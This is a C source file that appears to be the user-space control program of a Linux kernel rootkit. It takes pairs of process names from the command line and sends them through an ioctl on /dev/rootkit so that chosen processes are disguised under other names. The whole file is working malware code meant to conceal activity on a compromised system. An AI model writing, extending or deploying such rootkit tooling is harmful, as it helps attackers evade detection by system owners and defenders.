#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include "rootkit.h"

int main(int argc, char *argv[]) {
    int fd;
    struct masq_proc_req masq_req;
    masq_req.len = (argc - 1) / 2;
    masq_req.list = malloc(masq_req.len * sizeof(struct masq_proc));
    if (!masq_req.list) {
        perror("malloc");
        return -1;
    }

    for (int i = 0; i < masq_req.len; i++) {
        strncpy(masq_req.list[i].orig_name, argv[i * 2 + 1], MASQ_LEN - 1);
        strncpy(masq_req.list[i].new_name, argv[i * 2 + 2], MASQ_LEN - 1);
        masq_req.list[i].orig_name[MASQ_LEN - 1] = '\0';
        masq_req.list[i].new_name[MASQ_LEN - 1] = '\0';
    }

    fd = open("/dev/rootkit", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    if (ioctl(fd, IOCTL_MOD_MASQ, &masq_req) < 0) {
        perror("ioctl");
        return -1;
    }
    close(fd);
    return 0;
}
